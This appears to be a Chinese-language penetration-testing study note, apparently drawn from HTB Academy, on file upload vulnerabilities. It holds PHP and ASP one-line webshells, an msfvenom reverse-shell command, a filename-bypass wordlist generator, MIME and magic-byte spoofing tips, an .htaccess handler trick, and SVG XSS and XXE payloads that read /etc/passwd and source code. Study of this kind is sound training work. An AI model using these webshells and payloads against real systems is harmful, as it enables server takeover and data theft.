>[! warning ] 小節重點
>本章幾乎都是HTB academy 的內容，可以的
## 常用的webshell們
>[!warning ] 小節重點
>本章內容介紹常見的webshell、一句話木馬、好用的reverse shell、及其取得、產生來源。
- PHP一句話木馬
``` php
<?php system($_GET['cmd']); ?>
```
``` php
<?php system($_REQUEST['cmd']); ?>
```
``` php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
<?php system($_GET['cmd']); ?> 
<?php system($_REQUEST['cmd']); ?> 
<?php echo exec($_GET['cmd']); ?> 
<?php echo shell_exec($_GET['cmd']); ?> 
<?php echo passthru($_GET['cmd']); ?>
```
- PHP Reverse Shell [吉哈伯連結](https://github.com/pentestmonkey/php-reverse-shell)
- .NET一句話木馬 (ASP)
``` asp
<% eval request('cmd') %>
```
- msfvenom 產生webshell
```
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
## Client-Side Validation
>[!知識點]
>如果發現目標的過濾機制在前端的javascript或是html，可以利用burpsuit處理，或是直接移除html 程式碼裡面的function
### 黑名單過濾
>[!warning] 小節重點
>這邊提到的是後端針對附檔名的過濾，這邊嘗試做的是利用burpsuit把沒有在黑名單裡面的副檔名試出來。
- Extension ASP (PayloadAllTheThings) : [連結](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)
- Extension PHP (PayloadAllTheThings) : [連結](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
- web-extensions (SecList) : [連結](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)
### 白名單過濾
>[!warning] 小節重點
>白名單基本上會比較安全，這個章節我們主要是做三項:
>- Double Extensions
>- Reverse Double Extension
>-  Character Injection
- 以下程式碼是白名單過濾的範例
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```
#### Double Extensions
>有些檢查機制只會過濾第一個附檔名，以php為例，把第一個副檔名後面加上.php來還是可以過得去過濾。
```
shell.jpg.php
```
>[!danger] 重點
>如果過濾寫得好，那會過不去 ，另外可以先用[這份清單](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)檢查什麼檔案過得去
#### Reverse Double Extension
想定一個網頁系統的後端使用白名單過濾，但是使用Apache2及php7.4，那他的設定檔應該是長這樣
```
/etc/apache2/mods-enabled/php7.4.conf
```
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

這段話的意思是當檔案包含phar、php、phtml的時候，就可以使用`SetHandler application/x-httpd-php`，也就是可以執行的意思。那就有機會利用
```
shell.php.jpg
```
來執行，使用.jpg當成最後的附檔名可以通過排名單，但是Apache直接定義有.php就可以執行。
#### Character Injection
利用特殊編碼去欺騙php讓他執行
- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`
比如說利用`shell.php%00.jpg`就可以執行在php5之前的環境執行起來，以下bash可以產生所有相關的payload。
```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.php' '.php3' '.php4' '.php5' '.php7' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
## 檔案型態過濾
>[!warning] 小節重點
>這章主要在講新式的網頁不只會檢查附檔名，也會檢查檔案的內容，這章主要是講下列兩項:
>- Content-Type Header
>- File Content
### Content-Type
有時候可以透過burpsuit修改Content-Type的內容讓檔案執行，但是還是可以執行
- 網頁會過濾Content-Type的程式碼
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```
- 所有的content-type(SecList) : [連結](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
- 過濾出想用的content-type
``` bash
cat content-type.txt | grep 'image/' > image-content-types.txt
```
### MIME-Type
因為php利用`mime_content_type()`來判斷檔案的MIME-Type，而`mime_content_type()`判斷的放事就是判斷檔案開始的字元。

如果檔案開頭是`GIF87a`或是`GIF89a`，那`mime_content_type()`就會把檔案判斷為gif檔案，所以可以透過把檔案開始的字元修改成`GIF8`的方式來欺騙php。
### File Signatures
[參考資料](https://en.wikipedia.org/wiki/List_of_file_signatures)
>可以透過修burpsuit修改File Signature的方式來騙

- jpg 、jpeg (`ÿØÿà␀␐JFIF␀␁`)
```
FF D8 FF E0 00 10 4A 46 49 46 00 01
```
- jpg、jpeg(`ÿØÿî`)
```
FF D8 FF EE
```
- jpg、jpeg(`ÿØÿá??Exif␀␀`)
```
FF D8 FF E1 ?? ?? 45 78 69 66 00 00
```
- jpg(`ÿØÿà`)
```
FF D8 FF E0
```
### 修改可以執行的檔案
>[!note]
>`.htaccess`可以設定可被php執行的檔案，如果可以修改`.htaccess`，就應該可以上傳其他檔案類型來執行
- 我希望讓`.phpt`可以執行
```
echo "AddType application/x-httpd-php .phpt" > .htaccess
```
## Limited File Uploads
>[!warning] 小節重點
>當網站沒有任意檔案上傳的時候，還是有一些方法讓File Upload或其他攻擊手法創造機會，如果網頁可以上傳`SVG`, `HTML`, `XML`時，我們可以利用以下三種方法。
>- XXS
>- XXE
>- Dos
### XSS
當有機會上傳`HTML`檔案時，雖然沒有辦法直接執行，但是還是有機會透過暗藏javascript做到 XSS 或是 CSRF attack。
當有機會上傳`SVG`(Scalable Vector Graphics (SVG))的時候，就可以在裡面塞XSS payload。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
### XXE
對於可以上傳SVG的系統，可以利用XXE exploitation 做到information leak
- /etc/passwd leak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
- source code leak
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
- base64 decode
``` bash
echo "PD9waHAKJHRh....................................2FkIjsKfQo=" | base64 -d
```